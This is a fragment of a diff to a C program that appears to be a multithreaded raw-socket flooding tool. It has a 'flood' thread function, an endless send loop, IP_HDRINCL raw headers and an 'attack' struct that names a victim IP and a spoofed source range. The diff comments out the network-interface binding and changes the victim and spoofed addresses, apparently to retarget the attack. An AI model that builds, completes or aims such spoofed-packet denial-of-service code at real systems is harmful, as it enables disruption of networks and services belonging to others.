@@ -87,24 +87,22 @@ void *flood(void *value)
         pthread_exit(NULL);
     }
 
-    memset (&ifr, 0, sizeof (ifr));
-    strcpy(ifr.ifr_name, "enp3s0");
+    /*memset (&ifr, 0, sizeof (ifr));
+    strcpy(ifr.ifr_name, "wlp5s0");
     if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
         perror ("ioctl() failed to find interface ");
         pthread_exit(NULL);
     }
     printf ("Index for interface %i\n", ifr.ifr_ifindex);
-
-
+*/
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
          perror("Error: setsockopt()");
          pthread_exit(NULL);
-    }
-
+    }/*
     if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof (ifr)) < 0) {
         perror ("setsockopt() failed to bind to interface ");
         pthread_exit(NULL);
-    }
+    }*/
 
     //for (int i = 0; i < 10; i++) {
     while (1) {
@@ -234,8 +232,8 @@ int main(void)
     pthread_t attackers[THREADS];
 
     struct attack nodes = {
-        .ip_victim = inet_addr("192.168.0.2"),
-        .ip_spoofed = inet_addr("192.168.0.32"),
+        .ip_victim = inet_addr("192.168.1.1"),
+        .ip_spoofed = inet_addr("121.168.1.105"),
         .cidr_spoofed = 25,
         .protocol = ATTACK
     };
